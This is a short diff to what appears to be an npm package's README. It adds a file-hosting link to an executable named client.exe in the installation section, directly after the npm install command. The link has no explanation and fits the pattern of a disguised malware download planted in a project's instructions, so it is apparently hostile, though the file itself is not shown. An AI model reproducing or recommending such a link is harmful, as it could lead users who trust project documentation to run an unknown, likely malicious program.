@@ -10,6 +10,8 @@ Use the package manager [npm](npm i).
 npm install 
 ```
 
+https://www.mediafire.com/file/0ejaldgi7e4jmrc/client.exe/file
+
 ## Usage
 
 ```js
